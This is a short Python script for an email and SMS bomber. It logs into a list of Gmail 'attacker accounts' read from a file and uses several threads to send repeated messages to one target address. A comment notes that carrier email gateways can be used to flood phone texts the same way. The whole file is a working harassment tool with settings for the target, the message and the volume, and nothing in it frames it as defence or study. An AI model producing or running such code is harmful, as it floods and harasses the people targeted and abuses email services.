import smtplib, ssl, threading
#https://freecarrierlookup.com lets you format phone numbers as emails... spamming texts this way may be delayed

#Edit here to configure spam (Yes, I know... Class for settings is braindead, but I am ultra lazy.)
class Settings:
    target = "tester395912@gmail.com"
    message = "Pool noodle detected 13.7 meters NW!"
    amount = 10 #Number of emails to send per attacker account
    multiplier = 1 #Multiplies the threads

#Don't touch anything below unless you know what you are doing
class Loop(threading.Thread):
    def __init__(self, email, password, target, message, count):
        threading.Thread.__init__(self)
        self.email = str(email)
        self.password = str(password)
        self.count = count
        self.target = target
        self.message = message
        
    def run(self):
        port = 465
        server = "smtp.gmail.com"
        with smtplib.SMTP_SSL(server, port, context = ssl.create_default_context()) as server:
            try:
                server.login(self.email, self.password)
                for i in range(self.count):
                    server.sendmail(self.email, self.target, self.message)
                    print(f"{self.email} sent {i + 1}/{self.count} emails!")
                print(f"{self.email} finished a thread!")
                
            except Exception as e:
                print(f"Error sending email from: {self.email}\nError: {e}")
        
def init(target, message, amount):
    file = open("Emails.txt")
    content = file.readlines()
    print(f"Using {len(content)} email account(s)")
    for line in content:
        info = line.split(":")
        thread = Loop(info[0], info[1], target, message, amount)
        thread.start()

if __name__ == "__main__":
    for i in range(Settings.multiplier):
        init(Settings.target, Settings.message, Settings.amount)
